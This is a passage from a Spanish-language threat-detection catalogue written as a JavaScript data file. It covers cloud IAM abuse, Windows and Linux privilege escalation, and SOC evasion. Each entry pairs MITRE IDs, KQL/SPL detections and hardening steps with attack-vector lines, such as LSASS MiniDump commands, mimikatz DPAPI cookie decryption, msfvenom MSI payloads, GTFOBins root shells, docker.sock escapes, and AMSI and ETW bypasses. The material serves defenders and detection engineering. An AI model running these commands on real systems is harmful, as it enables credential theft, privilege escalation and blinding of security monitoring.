    descripcion_tecnica: 'API keys "de solo lectura" o "de prueba" embebidas en el JS del frontend o en el APK. No hay "API key pública": cualquier key en el cliente es extraíble (DevTools, decompilación) y abusada (quota, coste, o datos si el backend autoriza por key).',
    impacto_iam_soc: 'Abuso de coste (scraping via tu key de maps/translation), bypass de rate limit del backend y acceso a datos si la key está asociada a permisos. El SOC ve tráfico "legítimo" de la key desde IPs de todo el mundo.',
    vector_ataque: ['DevTools → Sources → búsqueda de AIza/AKIA/sk- en bundles', 'Decompilar APK: strings | grep api_key'],
    deteccion: {
      kql: '// Backend: 4xx/429 agrupados por API key con geolocalización dispersa; alertas de uso de keys fuera de patrones',
      spl: 'index=api status=429 | stats count by api_key, geo | where dc(geo) > 5',
    },
    mitigacion_hardening: ['Nunca API keys en cliente: backend proxy (BFF) para servicios de pago', 'Si es inevitable (Google Maps JS): key restringida por HTTP referrer + API restrictions + quota', 'Rotate y alerta por uso anómalo (geo/quota)'],
    parcheo_remediacion: ['Rotar la key expuesta y restringirla', 'Mover llamadas al backend proxy', 'Auditar el uso de la key previo (coste y acceso a datos)'],
    referencias: ['https://owasp.org/www-project-top-ten/2021/A02_2021-Cryptographic_Failures', 'https://cloud.google.com/docs/authentication/api-keys#securing'],
  },
  {
    id: 'CLD-017',
    nombre: 'Cross-cloud pivote (Entra ↔ AWS role chaining)',
    categoria: 'Cloud_IAM',
    severidad: 'High',
    mitre_attack: ['T1078.004', 'T1021'],
    descripcion_tecnica: 'Configuraciones híbridas: Entra ID SSO a AWS (SAML/OIDC federation) donde un usuario de nube puede asumir roles AWS sin segundo factor adicional. Comprometido el tenant (o el token), el atacante encadena roles AWS sin tocar la red corporativa.',
    impacto_iam_soc: 'Un solo phish de usuario con federation → acceso a múltiples accounts AWS. La trazabilidad se pierde entre clouds (CloudTrail muestra el assumed role, Entra muestra el sign-in — correlacionar manualmente). Los APTs chinos (Storm-0558-adjacent) usan exactamente estos puentes.',
    vector_ataque: ['Phishing de token Entra (AiTM proxy)', 'Assume role AWS vía la federation configurada (sin MFA extra)', 'Role chaining dentro de AWS para confundir el rastro'],
    deteccion: {
      kql: 'AWSCloudTrail | where EventName == "AssumeRoleWithSAML" or EventName == "AssumeRoleWithWebIdentity" | project TimeGenerated, SourceIdentity, RoleArn, ResponseElements | // correlacionar con SigninLogs del IdP por timestamp',
      spl: 'index=aws eventName="AssumeRoleWithSAML" | stats count by source_identity, role | sort -count',
    },
    mitigacion_hardening: ['Federation con MFA/risk-based CA en el IdP antes del assume', 'Roles federados mínimos + permission boundaries', 'Correlación SIEM de sign-in IdP ↔ AssumeRole AWS por timestamp/usuario'],
    parcheo_remediacion: ['Revocar refresh tokens del usuario en el IdP', 'Auditar sesiones asumidas en la ventana', 'Endurecer la federation (condiciones, roles) tras el incidente'],
    referencias: ['https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/aws-connector-integration', 'https://www.cisa.gov/sites/default/files/publications/aa23-136a_joint_advisory_hunting_guidance_for_infrastructure_as_a_service.pdf'],
  },
  {
    id: 'CLD-018',
    nombre: 'Persistence vía app registration / service principal nueva',
    categoria: 'Cloud_IAM',
    severidad: 'High',
    mitre_attack: ['T1098.001', 'T1078.004'],
    descripcion_tecnica: 'Backdoor favorito cloud: el atacante (ya admin o con derechos de app registration) crea una app/service principal con permisos Graph (Mail.ReadWrite, RoleManagement) y le añade una password o federated credential. Es "infraestructura legítima" que sobrevive a resets de usuarios.',
    impacto_iam_soc: 'Persistencia de meses invisible: la app aparece en el inventario de Entra como recurso normal. Detección: comparar app registrations contra baseline (fechas de creación, credenciales añadidas fuera de cambios), y federated credentials en apps que no los usaban.',
    vector_ataque: ['New-MgApplication con Mail.ReadWrite + client secret', 'Federated credential de GitHub en una app del tenant (abusable desde repos del atacante)'],
    deteccion: {
      kql: 'AuditLogs | where OperationName in ("Add application", "Add service principal credentials", "Add application certificate") | project TimeGenerated, InitiatedBy, TargetResources // apps nuevas fuera de ventanas de cambio',
      spl: 'index=o365 Operation="Add application." | stats count by actor, app_name',
    },
    mitigacion_hardening: ['Quién puede crear app registrations: restrinjir a un grupo de desarrolladores (Settings → Users can consent…)', 'Revisión periódica de apps + credenciales con fecha de creación reciente', 'Defender for Cloud Apps: alertas de nuevas apps/credentials'],
    parcheo_remediacion: ['Eliminar la app/sp backdoor', 'Rotar credenciales relacionadas', 'Auditar Graph API activity de esa app (qué leyó/modificó)'],
    referencias: ['https://attack.mitre.org/techniques/T1098/001/', 'https://www.mandiant.com/resources/blog/remediation-and-hardening-strategies-microsoft-365-defend-against-apt29'],
  },
  /* ============================ PRIVILEGE ESCALATION ============================ */
  {
    id: 'PRV-001',
    nombre: 'SeImpersonatePrivilege (familia Potato)',
    categoria: 'PrivEsc',
    severidad: 'Critical',
    mitre_attack: ['T1134.001'],
    descripcion_tecnica: 'Las cuentas de servicio (IIS, SQL, tareas programadas) tienen SeImpersonatePrivilege. Las herramientas Potato (JuicyPotato, RoguePotato, SweetPotato, GodPotato, CoercedPotato) abusan de NTLM local + RPC/DCOM para hacer que SYSTEM se autentique contra un proceso del atacante → token de SYSTEM impersonado.',
    impacto_iam_soc: 'Escalada estándar de servicio a SYSTEM en cualquier Windows con un servicio comprometido. Es el paso 2 de casi todo el ransomware moderno tras el acceso inicial web. Señal: procesos de servicio (w3wp.exe, sqlservr.exe) ejecutando COM/RPC raros o servicios instalándose solos.',
    vector_ataque: ['whoami /priv → SeImpersonatePrivilege presente', 'GodPotato -cmd "cmd /c whoami" (o SweetPotato en PS)', 'Potato moderno para Windows 2019/2022 (CoercedPotato)'],
    deteccion: {
      kql: 'DeviceProcessEvents | where InitiatingProcessFileName in ("w3wp.exe", "sqlservr.exe", "ntlmssp.exe") and FileName in ("godpotato.exe", "juicypotato.exe", "rottenpotato.exe") or ProcessCommandLine contains "potato"',
      spl: 'index=win sourcetype=XmlWinEventLog EventCode=4688 | regex process="(?i)(juicy|rogue|sweet|god)potato"',
      sigma: 'win_potato_activity',
      win_event_ids: [4688],
    },
    mitigacion_hardening: ['Windows 10/2019+: protected processes para servicios web (IIS: ApplicationPoolIdentity + no impersonación innecesaria)', 'Privilegios mínimos de las cuentas de servicio (quitar SeImpersonate si no se usa)', 'AppLocker/WDAC bloqueando ejecutables no firmados en carpetas de servicios web'],
    parcheo_remediacion: ['Parchear el vector de entrada (RCE web)', 'Revisar procesos creados por el servicio en la ventana', 'Rotar credenciales presentes en el host'],
    referencias: ['https://attack.mitre.org/techniques/T1134/001/', 'https://decoder.cloud/2017/12/23/the-lonely-potato/'],
  },
  {
    id: 'PRV-002',
    nombre: 'UAC bypass (faulthandling y variantes)',
    categoria: 'PrivEsc',
    severidad: 'Medium',
    mitre_attack: ['T1548.002'],
    descripcion_tecnica: 'Decenas de técnicas (fodhelper, computerdefaults, sdclt, eventvwr, silkbug…) abusan de auto-elevate COM interfaces y hijacking de registry keys HKCU para ejecutar código high-integrity sin prompt de UAC. Requiere usuario en grupo admins locales.',
    impacto_iam_soc: 'El usuario administrador "no elevado" es la frontera: si un proceso puede auto-elevararse silenciosamente, el malware en su sesión tiene SYSTEM-equivalente. UAC no es límite de seguridad, es conveniencia — los bypasses lo confirman.',
    vector_ataque: ['fodhelper.exe + HKCU hijack (1 línea de reg add)', 'sdclt.exe / computerdefaults.exe con shell\open\command override'],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName in ("fodhelper.exe", "computerdefaults.exe", "sdclt.exe", "eventvwr.exe") and InitiatingProcessFileName !in ("explorer.exe", "svchost.exe") | project Timestamp, FileName, ProcessCommandLine',
      sigma: 'win_uac_bypass_fodhelper',
      win_event_ids: [4688, 13],
    },
    mitigacion_hardening: ['UAC en nivel máximo (Always notify) para usuarios admin — con la fricción asumida', 'No usar cuentas admin para uso diario (el fix real: separación de cuentas)', 'AppLocker sobre los binarios auto-elevate o monitor de registry de las keys abusadas'],
    parcheo_remediacion: ['Parchear (muchos bypasses se han cerrado en builds modernas)', 'Hunt por los binarios elevados con procesos hijos raros', 'Migrar a usuarios estándar + LAPS para elevación puntual'],
    referencias: ['https://attack.mitre.org/techniques/T1548/002/', 'https://github.com/hfiref0x/UACME'],
  },
  {
    id: 'PRV-003',
    nombre: 'Servicios inseguros (unquoted path / weak permissions)',
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1574.009', 'T1543.003'],
    descripcion_tecnica: 'Servicios Windows que: (1) corren SYSTEM con binario en ruta sin comillas con espacios ("C:\\Program Files\\X\\svc.exe" → ejecuta C:\\Program.exe), (2) tienen DACLs que permiten reconfigurar el binario/ruta (sc config binPath=), (3) DLLs cargadas de rutas escribibles.',
    impacto_iam_soc: 'Escalada local trivial con accesschk/SharpUp/WinPEAS. Clásico de Windows desde siempre. Señal: servicios cuya ImagePath cambia (7045: servicio instalado con binario en temp/user) o archivos .exe creados en rutas de programas.',
    vector_ataque: ['accesschk.exe -uwcqv "Authenticated Users" * (recon DACLs)', 'sc config vulnsvc binPath= "cmd /c net localgroup administrators atacante /add"', 'DLL hijacking del servicio (procmon para encontrar la ruta)'],
    deteccion: {
      kql: 'DeviceRegistryEvents | where RegistryKey contains "HKLM\\SYSTEM\\CurrentControlSet\\Services" and (RegistryValueName == "ImagePath" and InitiatingProcessFileName !in ("sc.exe", "powershell.exe", "svchost.exe"))',
      sigma: 'win_service_imagepath_changed',
      win_event_ids: [7045, 4697],
    },
    mitigacion_hardening: ['Auditar DACLs de servicios con AccessChk/SharpUp periódicamente', 'Instalar servicios en rutas sin espacios o con comillas correctas', 'Denegar SERVICE_CHANGE_CONFIG a no-admins'],
    parcheo_remediacion: ['Corregir ImagePath/DACLs del servicio', 'Eliminar binarios plantados en rutas hijack', 'Rotar credenciales (el servicio corría SYSTEM: asumir dump de lo que tocaba)'],
    referencias: ['https://attack.mitre.org/techniques/T1574/009/', 'https://www.coresecurity.com/blog/windows-privilege-escalation-part-2'],
  },
  {
    id: 'PRV-004',
    nombre: 'AlwaysInstallElevated (MSI como SYSTEM)',
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1548.002'],
    descripcion_tecnica: 'Si los dos registry keys de AlwaysInstallElevated están a 1 (HKLM y HKCU de Windows Installer), cualquier .msi se instala con SYSTEM sin prompt. El usuario puede generar un MSI malicioso con msfvenom y ejecutarlo.',
    impacto_iam_soc: 'Escalada local directa de usuario a SYSTEM. Configuración que casi siempre es un error de imagen dorada o de una app legacy. Detección: la sola existencia de las keys a 1 (recon de config, no evento).',
    vector_ataque: ['reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', 'msfvenom -p windows/x64/exec CMD=… -f msi > evil.msi && msiexec /quiet /i evil.msi'],
    deteccion: {
      kql: 'DeviceRegistryEvents | where RegistryKey contains "AlwaysInstallElevated" and RegistryValueData == 1 // y 4688 de msiexec con msi en rutas de usuario',
      sigma: 'win_always_install_elevated_msi',
      win_event_ids: [4688],
    },
    mitigacion_hardening: ['Verificar y poner a 0 las dos keys (GPO: Prohibit Non-Administrators from applying updates)', 'Auditar con Baseline (PowerShell: Get-ItemProperty de las dos rutas)', 'Bloquear msiexec /quiet desde rutas de usuario'],
    parcheo_remediacion: ['Poner las keys a 0', 'Revisar msis instalados en la ventana', 'Hunt por msiexec con paquetes en %TEMP%'],
    referencias: ['https://attack.mitre.org/techniques/T1548/002/', 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation'],
  },
  {
    id: 'PRV-005',
    nombre: 'DLL hijacking / search order',
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1574.001'],
    descripcion_tecnica: 'Los procesos de Windows buscan DLLs en orden: directorio de la app → System32 → PATH → CWD. Un binario privilegiado que carga una DLL inexistente desde una ruta escribible permite plantar la DLL maliciosa. Aplica a servicios, tareas programadas y binarios auto-elevate.',
    impacto_iam_soc: 'Escalada silenciosa con ejecución legítima del binario original. Casos reales famosos: dlls de HP, herramientas de terceros y hasta binarios de Microsoft en rutas user-writable. Señal: Sysmon (eventos 7 de image load de DLLs fuera de System32 para procesos SYSTEM).',
    vector_ataque: ['procmon: NAME NOT FOUND de DLLs del proceso privilegiado', 'Plantar la DLL en la primera ruta escribible del search order'],
    deteccion: {
      kql: 'DeviceImageLoadEvents | where FolderPath !contains "system32" and InitiatingProcessAccountName == "SYSTEM" and (FolderPath contains "temp" or FolderPath contains "appdata")',
      sigma: 'sysmon_dll_load_from_user_folder',
      win_event_ids: [7],
    },
    mitigacion_hardening: ['SetDllDirectory / rutas absolutas en apps propias', 'Auditar binarios privilegiados con herramientas de hijack finding (DLLSpy)', 'AppLocker/WDAC: solo DLLs firmadas en rutas de sistema'],
    parcheo_remediacion: ['Eliminar las DLLs plantadas', 'Corregir el binario vulnerable o sus rutas', 'Forense: el código corrió como SYSTEM'],
    referencias: ['https://attack.mitre.org/techniques/T1574/001/', 'https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows'],
  },
  {
    id: 'PRV-006',
    nombre: 'LSASS credential dumping',
    categoria: 'PrivEsc',
    severidad: 'Critical',
    mitre_attack: ['T1003.001'],
    descripcion_tecnica: 'LSASS guarda en memoria credenciales de sesión: NTLM hashes, tickets Kerberos, DPAPI keys, credenciales de web SSO. Herramientas: mimikatz sekurlsa, comsvcs.dll MiniDump (una sola línea de PowerShell), rundll32 comsvcs, procdump, NanoDump, pypykatz para parsear offline.',
    impacto_iam_soc: 'El "all-in-one" del robo de credenciales: un dump = movimiento lateral (PtH) + persistencia (tickets). Protección: RunAsPPL bloquea acceso al proceso salvo firmados (mimikatz usa driver firmado robado para bypass → los EDR detectan el driver). Señal: Sysmon 10 (ProcessAccess a lsass.exe).',
    vector_ataque: ['rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump <pid> C:\\temp\\out.dmp full', 'mimikatz sekurlsa::logonpasswords', 'taskmgr con "Create dump file" (GUI)'],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName in ("rundll32.exe", "procdump.exe", "ntdsutil.exe") and ProcessCommandLine contains "lsass" or ProcessCommandLine contains "MiniDump"',
      spl: 'index=sysmon EventCode=10 TargetImage="*lsass.exe" | stats count by SourceImage, user | where SourceImage NOT IN (whitelist)',
      sigma: 'sysmon_lsass_access_generic',
      win_event_ids: [10, 4688],
    },
    mitigacion_hardening: ['RunAsPPL/Credential Guard en todos los endpoints (bloquea el dump desde procesos no firmados)', 'EDR con alertas de ProcessAccess a lsass', 'EnableSignatureValidation de LSA Plug-ins'],
    parcheo_remediacion: ['Asumir TODAS las cuentas con sesión en el host comprometidas: reset + purge de tickets', 'Hunt de accesos de esas cuentas en otros hosts', 'Forense del endpoint'],
    referencias: ['https://attack.mitre.org/techniques/T1003/001/', 'https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection'],
  },
  {
    id: 'PRV-007',
    nombre: 'DPAPI domain backup key — robo del "llavero del dominio"',
    categoria: 'PrivEsc',
    severidad: 'Critical',
    mitre_attack: ['T1555.004', 'T1003'],
    descripcion_tecnica: 'La backup key DPAPI del dominio (guardada en el DC, extraíble con DA) permite descifrar TODOS los blobs DPAPI de cualquier usuario: cookies de Chrome/Edge guardadas, credenciales de RDP guardadas, secretos de Outlook, WiFi, y vaults. Con mimikatz: lsadump::backupkeys + dpapi::chrome.',
    impacto_iam_soc: 'Una vez extraída (persiste mientras el dominio exista), cualquier blob DPAPI robado se descifra offline. Los infostealers modernos ya la integran. Es la razón por la que "guardar password en el navegador" en un dominio comprometido es fuga total.',
    vector_ataque: ['DA → lsadump::backupkeys /domain:corp.local /export', 'Robar blobs DPAPI de cualquier host (Cookies de Chrome: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies)', 'Descifrar offline: dpapi::chrome /in:Cookies /unprotect'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4662 and ObjectName contains "BCKUPKEY" // acceso al secret DPAPI del dominio',
      spl: 'index=win EventCode=4662 "BCKUPKEY" | stats count by user, src',
      win_event_ids: [4662],
    },
    mitigacion_hardening: ['Proteger DA (tier-0): la backup key solo se extrae con DA/DCSync', 'Alertar 4662 con BCKUPKEY desde no-DC', 'Cero secretos en navegadores para usuarios privilegiados (política + password manager)'],
    parcheo_remediacion: ['La backup key NO es rotulable fácil: el daño es permanente mientras existan blobs cifrados con ella', 'Reset masivo de credenciales de usuarios cuyos hosts se comprometieron', 'Migrar secretos sensibles fuera del navegador'],
    referencias: ['https://attack.mitre.org/techniques/T1555/004/', 'https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/'],
  },
  {
    id: 'PRV-008',
    nombre: 'sudo mal configurado / Baron Samedit (CVE-2021-3156)',
    categoria: 'PrivEsc',
    severidad: 'High',
    cve_ejemplo: ['CVE-2021-3156'],
    mitre_attack: ['T1548.003'],
    descripcion_tecnica: '(1) NOPASSWD en sudoers para binarios que abren shells (vim, less, find, awk) o con wildcards; (2) CVE-2021-3156: heap overflow en sudoedit < 1.9.5p2 da root sin password con solo ejecutar "sudoedit -s \\". Una línea.',
    impacto_iam_soc: 'Escalada estándar en Linux. El GTFOBins cubre cientos de binarios sudoables que son shell. Señal: ejecución de sudo por usuarios no habituales y uso de sudoedit con argumentos raros (para el CVE).',
    vector_ataque: ['sudo -l (recon de qué se puede)', 'sudo vim -c \':!bash\' (GTFOBins)', 'CVE-2021-3156: sudoedit -s "$(python3 -c \'print("A"*65536)\')"'],
    deteccion: {
      spl: 'index=nix sourcetype=linux_secure "sudo" | stats count by user, command | where user NOT IN (admins) | sort -count',
      sigma: 'lnx_sudo_edit_heap_overflow',
    },
    mitigacion_hardening: ['Auditar sudoers -l y eliminar NOPASSED innecesarios', 'Parchear sudo a 1.9.5p2+ (el CVE es de 2021: unscoped hosts = falta de patch hygiene)', 'Usar binarios específicos con argumentos fijos en sudoers (NO wildcards)'],
    parcheo_remediacion: ['Actualizar sudo en todos los hosts', 'Limpiar sudoers de entradas peligrosas', 'Rotar credenciales del host si hubo escalada'],
    referencias: ['https://attack.mitre.org/techniques/T1548/003/', 'https://www.sudo.ws/security/advisories/unescape_overflow/'],
  },
  {
    id: 'PRV-009',
    nombre: 'SUID/SGID + GTFOBins',
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1548.001'],
    descripcion_tecnica: 'Binarios con bit SUID ejecutan con el owner (root normalmente). Cualquier SUID de la lista GTFOBins (find, vim, nmap viejo, env, bash antiguo, python, cp de ciertos setups) permite spawn de shell root. Detección con un find de una línea.',
    impacto_iam_soc: 'Escalada local de Linux desde usuario a root. SUIDs "creativos" de software de terceros (agentes de backup, herramientas de monitorización) son los favoritos. Señal: ejecuciones de SUID con argumentos de shell (-c, -p, system()).',
    vector_ataque: ['find / -perm -4000 -type f 2>/dev/null (recon)', 'SUID find: find . -exec /bin/sh -p \\;'],
    deteccion: {
      spl: 'index=nix sourcetype=linux_secure | regex process="(?i)find .*(\\-exec|/bin/(ba)?sh)" | stats count by user, host',
    },
    mitigacion_hardening: ['Inventario de SUIDs permitido (baseline) + alertas de SUIDs nuevos', 'Quitar bit SUID de binarios que no lo necesitan (systemd Hardening: NoNewPrivileges)', 'Contenedores/K8s: drop ALL capabilities por defecto'],
    parcheo_remediacion: ['Quitar SUID de los binarios abusables', 'Hunt de ejecución de esos binarios con shells', 'Forense del host'],
    referencias: ['https://attack.mitre.org/techniques/T1548/001/', 'https://gtfobins.github.io/'],
  },
  {
    id: 'PRV-010',
    nombre: 'PwnKit — polkit pkexec (CVE-2021-4034)',
    categoria: 'PrivEsc',
    severidad: 'High',
    cve_ejemplo: ['CVE-2021-4034'],
    mitre_attack: ['T1068'],
    descripcion_tecnica: 'pkexec (SUID root, presente por defecto en todas las distros con polkit durante 12 años) tenía env var GCONV exploitation que da root instantáneo a cualquier usuario local. Publicado en enero 2022, explotado en masa (junto a DirtyPipe) contra hosts sin parchear.',
    impacto_iam_soc: 'LPE de 1 comando en ~todas las distros 2009-2021. Aún aparece en entornos con imágenes viejas (contenedores sobre todo). Señal: ejecución de pkexec con GCONV_PATH en el entorno o payloads "pwnkit" en /tmp.',
    vector_ataque: ['./cve-2021-4034 (poc público de 1 archivo C)'],
    deteccion: {
      spl: 'index=nix sourcetype=linux_secure pkexec | stats count by user, host | where user NOT IN (allowed)',
      sigma: 'lnx_pwnkit_pkexec',
    },
    mitigacion_hardening: ['Parchear polkit (enero 2022: TODAS las distros sacaron update)', 'En contenedores: imágenes base actualizadas (el fix es trivial)', 'Monitor de pkexec ejecutado por usuarios no-gráficos'],
    parcheo_remediacion: ['Actualizar polkit', 'Hunt de pkexec en logs históricos', 'Rotar credenciales del host afectado'],
    referencias: ['https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034', 'https://attack.mitre.org/techniques/T1068/'],
  },
  {
    id: 'PRV-011',
    nombre: 'Dirty Pipe (CVE-2022-0847)',
    categoria: 'PrivEsc',
    severidad: 'High',
    cve_ejemplo: ['CVE-2022-0847'],
    mitre_attack: ['T1068'],
    descripcion_tecnica: 'Bug del kernel Linux 5.8-5.16 que permitía escribir en archivos read-only (incluido /etc/passwd: cambiar el hash del root). Explotación de un script, sin permisos, silenciosa. Parcheado en marzo 2022.',
    impacto_iam_soc: 'Root en hosts con kernels 5.8-5.16. La técnica /etc/passwd deja el root hash cambiado — señal forense clara. Contenedores con kernel del host vulnerable = escape potencial.',
    vector_ataque: ['./dirty-pipe.sh /etc/passwd (poc público)'],
    deteccion: {
      spl: 'index=nix sourcetype=linux_secure | stats count by user where file="/etc/passwd" AND action=modified AND user != root',
    },
    mitigacion_hardening: ['Actualizar kernel (marzo 2022+)', 'Aislar contenedores con kernel vulnerable (el kernel es compartido)', 'Monitorear modificaciones de /etc/passwd por no-root'],
    parcheo_remediacion: ['Reboot con kernel parcheado (hot-patch insuficiente: el fix es de kernel)', 'Restaurar /etc/passwd desde backup', 'Rotar todas las credenciales del host'],
    referencias: ['https://dirtypipe.cm4all.com/', 'https://attack.mitre.org/techniques/T1068/'],
  },
  {
    id: 'PRV-012',
    nombre: 'Container escape (privileged, docker.sock, hostPath)',
    categoria: 'PrivEsc',
    severidad: 'Critical',
    mitre_attack: ['T1611'],
    descripcion_tecnica: 'Contenedores con --privileged, con /var/run/docker.sock montado, o en K8s con hostPath / o /proc: acceso al host directo. Escape clásico: nsenter al namespace del host, o crear contenedor privileged montando / del host.',
    impacto_iam_soc: 'De contenedor comprometido a root del nodo: creds del node (K8s SA, cloud instance role), todos los pods del node. En clústeres cloud: cadena directa a credenciales del cloud. Señal: procesos con nsenter/unshare, montajes raros, acceso a docker.sock.',
    vector_ataque: ['docker run -v /:/host -it alpine (si tienes docker.sock)', 'nsenter --target 1 --mount --uts --ipc --net --pid', 'K8s: pod con hostPID:true + nsenter'],
    deteccion: {
      kql: 'DeviceProcessEvents | where ProcessCommandLine contains "nsenter" or ProcessCommandLine contains "unshare" | project Timestamp, ProcessCommandLine, InitiatingProcessFileName',
      spl: 'index=nix "nsenter" OR "unshare" | stats count by user, container, host',
      sigma: 'lnx_container_escape_nsenter',
    },
    mitigacion_hardening: ['Cero --privileged; read-only rootfs; capabilities drop ALL', 'docker.sock NUNCA montado en contenedores (DinD aislado si hace falta)', 'K8s: Pod Security Standards restricted (bloquea hostPID/hostPath/*)'],
    parcheo_remediacion: ['Aislar el nodo comprometido (cordon + forense)', 'Rotar las credenciales del nodo (SA tokens, instance roles)', 'Auditar pods creados en la ventana'],
    referencias: ['https://attack.mitre.org/techniques/T1611/', 'https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html'],
  },
  {
    id: 'PRV-013',
    nombre: 'Token manipulation / Incognito',
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1134'],
    descripcion_tecnica: 'Robo y suplantación de tokens de acceso Windows: con SeImpersonate o tras dump de LSASS, Incognito (mimikatz token::*) lista tokens disponibles e impersona admins conectados (p. ej. un admin con sesión RDP en el mismo host).',
    impacto_iam_soc: 'Ejecutar procesos "como" otro usuario sin tocar su password. Común en RDP servers (Terminal Servers) donde tokens de otros usuarios conviven. Señal: procesos iniciados con tokens de usuarios sin login previo local (Sysmon correlación 4624/4688).',
    vector_ataque: ['mimikatz privilege::debug token::list', 'token::elevate (impersonar token admin disponible)'],
    deteccion: {
      kql: 'DeviceProcessEvents | where ProcessIntegrityLevel == "High" and AccountName != InitiatingProcessAccountName | project Timestamp, FileName, AccountName, InitiatingProcessAccountName',
      sigma: 'win_token_impersonation',
      win_event_ids: [4688],
    },
    mitigacion_hardening: ['Cerrar sesiones RDP al desconectar (no dejarlas huerfanas)', 'RunAsPPL dificulta el dump inicial', 'Restringir logons interactivos en hosts compartidos'],
    parcheo_remediacion: ['Reset de cuentas impersonadas', 'Cerrar sesiones del host', 'Forense del proceso con token robado'],
    referencias: ['https://attack.mitre.org/techniques/T1134/', 'https://adsecurity.org/?p=1667'],
  },
  {
    id: 'PRV-014',
    nombre: 'GPO edit rights → escala de dominio',
    categoria: 'PrivEsc',
    severidad: 'Critical',
    mitre_attack: ['T1484.001', 'T1222'],
    descripcion_tecnica: 'Quien puede editar una GPO vinculada a OUs con DCs/servidores controla esos hosts: la GPO agrega un usuario al grupo de admins locales, crea una tarea programada (SharpGPOAbuse) o escribe un script de logon. Es escalada de dominio sin tocar DCs.',
    impacto_iam_soc: 'Persistencia + escalada masiva: una sola GPO compromete todos los hosts del scope. SharpGPOAbuse crea tareas inmediatas sin esperar el refresh. Señal: cambios en SYSVOL (5145 con .xml de GPO por usuarios no-GPO-admins) y eventos 4719 (auditoría de política cambiada).',
    vector_ataque: ['SharpGPOAbuse --AddComputerTask --GPOName "Default Domain Policy" …', 'Editar GptTmpl.inf (grupos restringidos: añadirse a admins)'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 5145 and RelativeTargetName contains "GptTmpl.inf" and SubjectUserName !endswith "$" | project TimeGenerated, SubjectUserName, IpAddress',
      sigma: 'win_gpo_gpttmpl_modified',
      win_event_ids: [5145, 4719],
    },
    mitigacion_hardening: ['Auditar quién edita GPOs (Group Policy Management > Delegation)', 'Tiering: GPOs de Tier-0 solo editables por Tier-0 admins', 'Alertar cambios en SYSVOL de GPOs críticas'],
    parcheo_remediacion: ['Revertir la GPO maliciosa desde backup', 'Buscar hosts que aplicaron la política (gpresult) y forense', 'Rotar credenciales de los hosts afectados'],
    referencias: ['https://attack.mitre.org/techniques/T1484/001/', 'https://github.com/FSecureLABS/SharpGPOAbuse'],
  },
  /* ============================ SOC EVASION ============================ */
  {
    id: 'SOC-001',
    nombre: 'AMSI bypass',
    categoria: 'SOC_Evasion',
    severidad: 'High',
    mitre_attack: ['T1562.001'],
    descripcion_tecnica: 'AMSI (Antimalware Scan Interface) escanea contenido de PowerShell/VBScript/JScript antes de ejecutarlo. Los bypasses parchean la función AmsiScanBuffer en memoria (una línea de PowerShell), ofuscan el payload (base64, string concat, .NET reflection) o abusan de .NET AMSI init failure.',
    impacto_iam_soc: 'PowerShell sin AMSI = ejecución de mimikatz/Powerview sin que Defender lo vea. Los EDR modernos vigilan los mismos patrones, pero los bypasses evolucionan (la fuerza del atacante es que solo necesita UNO que funcione). Señal: PowerShell con strings sospechosos de bypass ($AmsiUtils, AmsiScanBuffer, System.Management.Automation.AmsiUtils).',
    vector_ataque: ['[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")… (patch en memoria)', 'Ofuscación: -enc, concatenación, IEX con strings invertidos'],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName == "powershell.exe" and (ProcessCommandLine contains "AmsiUtils" or ProcessCommandLine contains "AmsiScanBuffer" or ProcessCommandLine contains "NonPublic,Static") | project Timestamp, ProcessCommandLine',
      spl: 'index=win sourcetype=XmlWinEventLog EventCode=4104 | regex ScriptBlockText="(?i)(amsiutils|amsiscanbuffer|amsiInitFailed)"',
      sigma: 'win_amsi_bypass',
      win_event_ids: [4104, 4688],
    },
    mitigacion_hardening: ['PowerShell Constrained Language Mode + ScriptBlock Logging (4104) SIEMPRE on', 'Defender con AMSI + EDR behavioural (el bypass de la función no ciega el telemetry de procesos)', 'Bloquear la descarga de payloads con Mark-of-the-Web'],
    parcheo_remediacion: ['Parchear (algunos bypasses se rompen con updates de .NET/PowerShell)', 'Hunt de 4104 con patrones AMSI', 'Forense del proceso que hizo el patch'],
    referencias: ['https://attack.mitre.org/techniques/T1562/001/', 'https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-amsi-'],
  },
  {
    id: 'SOC-002',
    nombre: 'ETW tampering (cegado de telemetría)',
    categoria: 'SOC_Evasion',
    severidad: 'High',
    mitre_attack: ['T1562.001'],
    descripcion_tecnica: 'ETW (Event Tracing for Windows) alimenta los EDR (Sysmon, Defender, SentinelOne usan providers ETW). El tampering parchea funciones clave (EtwEventWrite) en memoria del proceso malicioso o elimina providers (logman stop, wevtutil). Herramientas: TamperETW, SilentMoonwalk (stack spoofing).',
    impacto_iam_soc: 'El proceso malicioso sigue corriendo pero sus eventos nunca llegan al EDR/SIEM. Es el arma anti-EDR de los ransomware modernos (Akira, BlackCat usan tampering de ETW). Señal: el cese de eventos de UN proceso (gap de telemetría) es en sí anomalía.',
    vector_ataque: ['Parchear EtwEventWrite en el proceso inyectado (hooking)', 'logman stop "Microsoft-Windows-Sysmon/Operational" o wevtutil sl con /e:false'],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName in ("logman.exe", "wevtutil.exe") and ProcessCommandLine contains ("stop" or "sl") | project Timestamp, ProcessCommandLine',
